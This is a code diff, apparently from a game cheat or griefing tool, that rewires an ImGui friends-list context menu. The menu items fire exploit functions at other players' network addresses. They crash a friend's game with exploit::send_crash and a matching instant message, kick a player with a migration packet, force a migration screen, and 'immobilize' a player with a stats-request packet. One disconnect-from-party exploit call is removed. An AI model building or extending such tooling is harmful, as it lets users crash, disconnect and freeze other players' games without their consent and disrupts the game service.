@@ -270,20 +270,25 @@ namespace friends
 							events::instant_message::send_popup(friends.steam_id);
 						}
 						
-						if (ImGui::MenuItem("Remove from party", nullptr, nullptr, response.valid))
+						if (ImGui::MenuItem("Crash game", nullptr, nullptr, response.valid))
 						{
-							exploit::send_disconnect_client(netadr, friends.steam_id);
+							exploit::send_crash(netadr);
+							events::instant_message::send_crash(friends.steam_id);
 						}
 
-						if (ImGui::MenuItem("Kick", nullptr, nullptr, response.valid))
+						if (ImGui::MenuItem("Kick player", nullptr, nullptr, response.valid))
 						{
 							exploit::send_connect_response_migration_packet(netadr);
 						}
 
-						if (ImGui::MenuItem("Crash", nullptr, nullptr, response.valid))
+						if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, response.valid))
 						{
-							exploit::send_crash(netadr);
-							events::instant_message::send_crash(friends.steam_id);
+							exploit::send_mstart_packet(netadr);
+						}
+
+						if (ImGui::MenuItem("Immobilize", nullptr, nullptr, response.valid))
+						{
+							exploit::send_request_stats_packet(netadr);
 						}
 
 						if (ImGui::BeginMenu("Send OOB##" + std::to_string(friend_num), response.valid))
